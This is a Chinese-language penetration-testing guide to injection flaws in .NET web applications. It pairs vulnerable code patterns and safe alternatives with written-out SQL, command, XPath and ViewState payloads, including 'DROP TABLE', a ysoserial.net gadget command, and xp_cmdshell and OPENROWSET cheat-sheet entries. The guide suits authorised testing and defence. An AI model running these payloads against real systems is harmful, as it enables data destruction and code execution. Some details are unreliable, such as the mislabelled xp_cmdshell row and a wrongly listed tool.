# .NET 注入测试方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 .NET 应用注入漏洞的系统化测试流程，覆盖 SQL 注入、命令注入、XPath 注入、反序列化等 .NET 特有的注入类型。

## 1.2 适用范围
适用于使用 .NET Framework、.NET Core、ASP.NET、ASP.NET Core 技术的 Web 应用和 API 接口。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：.NET 应用注入系统化测试

### 2.1 技术介绍

.NET 应用注入测试针对 .NET 技术栈特有的漏洞类型，包括：
- **SQL 注入**：ADO.NET、Entity Framework、Dapper 中的注入
- **命令注入**：Process.Start()、Command.Execute
- **XPath 注入**：XmlDocument、XPathNavigator
- **反序列化漏洞**：ViewState、ObjectStateFormatter
- **模板注入**：Razor、ASP.NET Template

### 2.2 测试范围

| 测试对象 | 测试内容 |
|---------|---------|
| **框架** | ASP.NET Web Forms、MVC、Core、Web API |
| **ORM** | Entity Framework、Dapper、NHibernate |
| **注入类型** | SQL、命令、XPath、反序列化、SSTI |
| **输入点** | 请求参数、HTTP 头、Cookie、ViewState |

### 2.3 测试流程

#### 2.3.1 技术栈识别

**框架识别方法：**

```
# 响应头特征
X-AspNet-Version: 4.0.30319
X-AspNetMvc-Version: 5.2
X-Powered-By: ASP.NET

# URL 路径特征
/WebResource.axd
/ScriptResource.axd
/__VIEWSTATE

# 文件扩展名
.aspx, .ashx, .asmx, .axd

# 错误页面特征
Server Error in '/' Application
Version Information: Microsoft .NET Framework
```

#### 2.3.2 SQL 注入测试（.NET）

**ADO.NET 测试：**
```csharp
// 危险代码模式
SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE id = " + userId);
SqlDataReader reader = cmd.ExecuteReader();

// 测试 Payload
id=1'
id=1' OR '1'='1
id=1; DROP TABLE users--
id=1'; WAITFOR DELAY '0:0:5'--
```

**Entity Framework 测试：**
```csharp
// 危险代码模式
var users = db.Database.SqlQuery<User>("SELECT * FROM Users WHERE Name = '" + userInput + "'");

// 测试 Payload
userInput=admin'--
userInput=' OR '1'='1'/*
```

**Dapper 测试：**
```csharp
// 危险代码模式
var sql = "SELECT * FROM users WHERE id = " + userId;
var user = connection.Query<User>(sql);

// 安全代码
var user = connection.Query<User>("SELECT * FROM users WHERE id = @id", new { id = userId });
```

#### 2.3.3 命令注入测试（.NET）

**危险函数识别：**
```csharp
// 危险函数
Process.Start(command);
Process.Start("cmd.exe", "/c " + userInput);
```

**测试 Payload：**
```
# 基础命令
param=&dir
param=|dir
param=%26dir

# 时间延迟
param=&timeout /t 5
param=&ping -n 5 127.0.0.1

# PowerShell
param=;powershell -c "Get-Process"
```

#### 2.3.4 XPath 注入测试

**危险代码识别：**
```csharp
// 危险代码
XPathNavigator nav = doc.CreateNavigator();
XPathExpression expr = nav.Compile("//user[username='" + user + "']");
```

**测试 Payload：**
```
# 认证绕过
username=' or '1'='1
password=anything

# 盲注
username=' and substring(//user[1]/username,1,1)='a
```

#### 2.3.5 反序列化测试

**ViewState 反序列化：**
```
# 识别 ViewState
__VIEWSTATE=wOz2...（Base64 编码）

# 测试 Payload
使用 ysoserial.net 生成 Payload
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc.exe" --decryptionalg="3DES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

**ObjectStateFormatter：**
```csharp
// 危险代码
var obj = LosFormatter.Deserialize(input);
```

### 2.4 测试用例清单

#### 2.4.1 ASP.NET Web Forms 测试

```
# ViewState 操作
POST /login.aspx
__VIEWSTATE=TAMPERED_PAYLOAD

# Event Validation 绕过
__EVENTVALIDATION=invalid

# ScriptManager 测试
ScriptManager1_TSM=malicious
```

#### 2.4.2 ASP.NET MVC 测试

```
# 模型绑定注入
POST /api/user
{"Username": "admin'--", "Password": "test"}

# Action 参数注入
GET /api/search?query=' OR 1=1--

# Filter 注入
GET /api/users?filter=1=1
```

#### 2.4.3 Web API 测试

```
# JSON 注入
POST /api/login
{"username": {"$ne": null}, "password": {"$ne": null}}

# XML 注入
POST /api/login
<Login><username>admin'--</username><password>test</password></Login>

# OData 注入
GET /api/users?$filter=Username eq 'admin' or 1 eq 1
```

#### 2.4.4 Entity Framework 测试

```
# 原生 SQL 注入
GET /api/user?id=1' OR '1'='1'--

# LINQ 注入（如果动态构建）
var query = db.Users.Where("Username = '" + user + "'");
```

#### 2.4.5 HTTP 头测试

```
# X-Forwarded-For
X-Forwarded-For: 127.0.0.1'; WAITFOR DELAY '0:0:5'--

# Cookie
Cookie: session=admin'--
Cookie: id=1; DROP TABLE users--

# User-Agent
User-Agent: '; WAITFOR DELAY '0:0:5'--
```

### 2.5 自动化测试工具

#### 工具推荐

```bash
# SQLMap - SQL 注入
sqlmap -u "http://target/page.aspx?id=1" --dbms=mssql

# ysoserial.net - 反序列化 Payload
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc.exe"

# Sitecore 扫描
sitecore-scanner http://target

# .NET 反序列化测试
NDesk.Options
```

#### Burp Suite 插件

- **ViewState Editor** - 编辑 ViewState
- **.NET Formatter** - .NET 序列化/反序列化
- **Hackvertor** - 编码/解码

### 2.6 测试报告要点

测试完成后，报告应包含：
1. .NET 框架版本
2. 所有测试的输入点列表
3. 发现的漏洞点及详情
4. ViewState 配置安全性
5. 潜在影响范围
6. 修复建议

---

# 第三部分：附录

## 3.1 .NET 危险函数速查表

| 类别 | 危险函数 | 安全替代 |
|-----|---------|---------|
| **SQL 查询** | `SqlCommand(sql)` | `SqlCommand(sql, conn, params)` |
| **SQL 查询** | `Database.SqlQuery()` | `FromSqlInterpolated()` |
| **命令执行** | `Process.Start(cmd)` | 参数白名单验证 |
| **XPath** | `Compile(xpath)` | 参数化查询 |
| **XML** | `XmlDocument.LoadXml()` | 禁用 DTD |
| **反序列化** | `LosFormatter.Deserialize()` | 验证输入来源 |
| **文件** | `File.ReadAllText(path)` | 路径白名单 |

## 3.2 SQL Server 注入 Payload 速查表

| 操作 | Payload |
|-----|---------|
| **版本查询** | `SELECT @@version` |
| **当前用户** | `SELECT SYSTEM_USER` |
| **当前数据库** | `SELECT DB_NAME()` |
| **时间延迟** | `WAITFOR DELAY '0:0:5'` |
| **列出数据库** | `SELECT name FROM sys.databases` |
| **列出表** | `SELECT table_name FROM information_schema.tables` |
| **列出列** | `SELECT column_name FROM information_schema.columns` |
| **读取文件** | `SELECT * FROM OPENROWSET(BULK 'C:\file.txt', SINGLE_CLOB) AS x` |
| **写文件** | `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;` |

## 3.3 参考资源

- [OWASP .NET Security](https://owasp.org/www-project-dotnet-security/)
- [Microsoft Security Guidance](https://docs.microsoft.com/en-us/dotnet/framework/security/)
- [PortSwigger - .NET Deserialization](https://portswigger.net/research/exploiting-deserialisation-in-asp-net-via-viewstate)
